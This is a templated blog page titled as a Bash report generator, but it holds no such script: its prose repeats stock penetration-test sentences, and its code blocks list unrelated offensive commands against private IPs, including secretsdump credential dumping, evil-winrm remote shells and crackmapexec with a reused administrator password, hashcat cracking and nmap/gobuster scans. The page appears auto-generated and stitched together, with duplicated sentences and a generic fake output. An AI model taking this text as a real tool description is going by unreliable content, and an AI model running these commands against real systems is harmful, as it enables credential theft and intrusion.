---
TitleSEO: "Automated Report Generator in Bash | ZureFX"
TitlePost: "Automated Report Generator — Bash"
Author: "ZureFX"
Description: "A Bash script for automated report generator. Built for security research and automation."
Keywords: "c, python, rust, script, bash"
URL: "https://zurefx.github.io/scripting/script-automated-report-generator-493.html"
URL_IMAGES: ""
Date: "2024-03-27"
Tags: "C, Python, Rust, Script, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-automated-report-generator-493"
Permalink: "/scripting/script-automated-report-generator-493.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `secretsdump`
- `kerbrute`
- `mimikatz`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
nmap -sCV -p995,587,3268 10.49.78.68 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.86.240.166
gobuster dir -u http://10.21.156.25/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services.

### Helper Functions

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
evil-winrm -i 10.113.17.240 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.106.151.19 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p110,389,21 10.15.14.132 -oN scan.txt
```

## Usage

### Basic Usage

Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files.

```bash
crackmapexec smb 10.32.137.189 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

```bash
evil-winrm -i 10.72.79.226 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.97.147.51 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.43.202.178 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.73.207.182/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Output

### Example Output

The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services.

```
[+] Scanning target...
[+] Found 13 results
[+] Done in 11.23s
```
